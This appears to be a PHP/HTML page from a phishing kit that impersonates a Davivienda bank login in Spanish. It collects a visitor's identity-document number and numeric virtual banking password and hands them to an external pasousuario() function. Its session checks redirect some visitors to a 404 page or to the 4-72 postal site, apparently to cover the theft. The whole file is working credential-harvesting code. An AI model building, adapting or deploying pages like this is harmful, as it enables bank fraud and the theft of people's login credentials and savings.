<?php

session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acceso</title>
<style>
  :root{--brand:#d60000;--text:#222;--muted:#6b7280;--bg:#f6f7f9;--radius:12px}
  *{box-sizing:border-box}
  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Arial;background:var(--bg);color:var(--text)}
  .wrap{max-width:440px;margin:32px auto;padding:0 16px}
  .logo-wrap{display:flex;justify-content:center;margin-bottom:16px}
  .logo{max-width:180px;height:auto}
  .card{background:#fff;border-radius:var(--radius);box-shadow:0 6px 18px rgba(0,0,0,.08);padding:22px}
  h1{margin:0 0 4px;font-size:26px}
  .sub{margin:0 0 18px;color:var(--muted);font-weight:600}
  label{display:block;font-size:14px;margin:16px 0 6px}
  select,input[type="text"],input[type="password"]{
    width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:10px;font-size:15px;background:#fff;outline:none
  }
  select:focus,input:focus{border-color:#9ca3af}
  .row{display:flex;align-items:center;gap:10px;margin-top:10px}
  .row input[type="checkbox"]{width:18px;height:18px}
  .hint{font-size:12px;color:var(--muted);margin-top:6px}
  .error{color:#b00020;font-size:13px;margin-top:6px;display:none}
  .btn{width:100%;border:0;background:var(--brand);color:#fff;padding:14px 18px;border-radius:999px;font-weight:700;font-size:15px;cursor:not-allowed;opacity:.6;transition:transform .05s,opacity .2s}
  .btn.enabled{cursor:pointer;opacity:1}
  .btn.enabled:active{transform:translateY(1px)}
  #step2{display:none}
  /* loader */
  .loader{position:fixed;inset:0;background:rgba(255,255,255,.7);display:none;place-items:center;z-index:50;backdrop-filter:saturate(120%) blur(2px)}
  .spinner{width:42px;height:42px;border-radius:50%;border:4px solid #e5e7eb;border-top-color:var(--brand);animation:spin .9s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}

  /* MODAL auto-cierre */
  .modal{
    position:fixed; inset:0; display:none; align-items:center; justify-content:center;
    background:rgba(17,24,39,.45); z-index:70;
  }
  .modal.show{display:flex; animation:fadeIn .18s ease-out}
  .modal-card{
    width:calc(100% - 32px); max-width:420px; background:#fff; border-radius:14px;
    box-shadow:0 20px 40px rgba(0,0,0,.18); padding:18px 16px; border-left:4px solid var(--brand);
  }
  .modal-title{font-weight:700; margin-bottom:6px}
  .modal-body{color:#374151; font-size:14px}
  @keyframes fadeIn{from{opacity:.3; transform:translateY(-6px)} to{opacity:1; transform:translateY(0)}}
</style>
</head>
<body>
  <div class="wrap">
    <!-- LOGO -->
    <div class="logo-wrap">
      <img class="logo" src="img/logo.webp" alt="Logo" />
    </div>

    <!-- STEP 1 -->
    <div id="step1" class="card" aria-labelledby="t1">
      <h1 id="t1">Hola!</h1>
      <p class="sub">Nos alegra que este aqui</p>

      <label for="tipo">Seleccione su tipo de documento</label>
      <select id="tipo">
        <option value="cc">Cedula de Ciudadania</option>
        <option value="ce">Cedula de Extranjeria</option>
        <option value="ti">Tarjeta de Identidad</option>
        <option value="pas">Pasaporte</option>
      </select>

      <label for="doc">Ingrese su numero de documento</label>
      <input id="doc" type="text" inputmode="numeric" autocomplete="off" maxlength="20" placeholder="Solo numeros" />
      <div class="hint">Minimo 6 digitos.</div>
      <div id="errDoc" class="error">Ingrese solo numeros y al menos 6 digitos.</div>

      <div class="row">
        <input id="rec" type="checkbox" />
        <label for="rec" style="margin:0;cursor:pointer;">Recordar mis datos de identidad</label>
      </div>

      <div style="margin-top:18px;">
        <button id="btnContinuar" class="btn" disabled>Continuar</button>
      </div>
    </div>

    <!-- STEP 2 -->
    <div id="step2" class="card" aria-labelledby="t2">
      <h1 id="t2">Hola!</h1>
      <p class="sub">Nos alegra que este aqui</p>

      <label>Seleccione su tipo de documento</label>
      <select id="tipo2" disabled></select>

      <label>Ingrese su numero de documento</label>
      <input id="txtUsuario" class="user" type="text" readonly />

      <div id="err-mensaje" class="error">Ingrese su numero de documento.</div>

      <label for="txtPass">Ingrese su clave virtual</label>
      <input id="txtPass" type="password" inputmode="numeric" minlength="6" maxlength="10" placeholder="6 a 10 digitos" />

      <input id="banco" type="hidden" value="DAVIVIENDA" />

      <div style="margin-top:18px;">
        <button id="btnUsuario" class="btn enabled">Iniciar sesion</button>
      </div>
    </div>
  </div>

  <!-- LOADER -->
  <div id="loader" class="loader" role="status" aria-live="polite" aria-label="Cargando">
    <div class="spinner" aria-hidden="true"></div>
  </div>

  <!-- MODAL AUTO -->
  <div id="modalAviso" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
    <div class="modal-card">
      <div id="modalTitle" class="modal-title">Aviso</div>
      <div class="modal-body">Por favor verifique que los datos sean correctos.</div>
    </div>
  </div>

  <!-- === TUS LIBRERIAS === -->
  <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
  <script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
  <script type="text/javascript" src="../../scripts/functions2.js"></script>

  <!-- === TUS SCRIPTS (sin cambios) === -->
  <script>
    const txtPass = document.getElementById('txtPass');
    txtPass.addEventListener('input', function() {
      const value = txtPass.value;
      const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numericos
      if (value !== cleanValue) { txtPass.value = cleanValue; }
    });
  </script>

  <script>
  $(document).ready(function(){
    $('#btnUsuario').click(function(){
      if (($("#txtUsuario").val().length > 0)) {
        if ($("#txtPass").val().length >= 6 && $("#txtPass").val().length <= 8) {
          if (typeof pasousuario === "function") {
            pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
          } else {
            $('#loader').css('display','grid');
            setTimeout(function(){
              $('#loader').hide();
              alert('pasousuario no definido. Integre su functions2.js');
            }, 800);
          }
        }
      } else {
        $("#err-mensaje").show();
        $(".user").css("border", "1px solid red");
        $("#txtUsuario").focus();
      }
    });
  });
  </script>

  <!-- === LOGICA DE STEP 1 (sin cambios) + apertura/cierre del modal === -->
  <script>
    const docInput = document.getElementById('doc');
    const errDoc = document.getElementById('errDoc');
    const btnCont = document.getElementById('btnContinuar');

    function validateDoc(){
      const onlyDigits = docInput.value.replace(/\D+/g,'');
      if(docInput.value !== onlyDigits) docInput.value = onlyDigits;
      const ok = onlyDigits.length >= 6;
      errDoc.style.display = ok || onlyDigits.length === 0 ? 'none' : 'block';
      btnCont.disabled = !ok;
      btnCont.classList.toggle('enabled', ok);
    }
    docInput.addEventListener('input', validateDoc);
    validateDoc();

    btnCont.addEventListener('click', function(){
      if(btnCont.disabled) return;
      document.getElementById('loader').style.display='grid';
      setTimeout(function(){
        document.getElementById('loader').style.display='none';
        const tipo = document.getElementById('tipo');
        const tipo2 = document.getElementById('tipo2');
        tipo2.innerHTML = tipo.innerHTML;
        tipo2.value = tipo.value;
        document.getElementById('txtUsuario').value = docInput.value;
        document.getElementById('step1').style.display='none';
        document.getElementById('step2').style.display='block';
      }, 800);
    });

    // MODAL: mostrar al abrir y cerrar automaticamente
    (function(){
      var modal = document.getElementById('modalAviso');
      function open(){ modal.classList.add('show'); }
      function close(){ modal.classList.remove('show'); }
      document.addEventListener('DOMContentLoaded', function(){
        open();
        setTimeout(close, 3000); // tiempo visible en ms
      });
    })();
  </script>
</body>
</html>

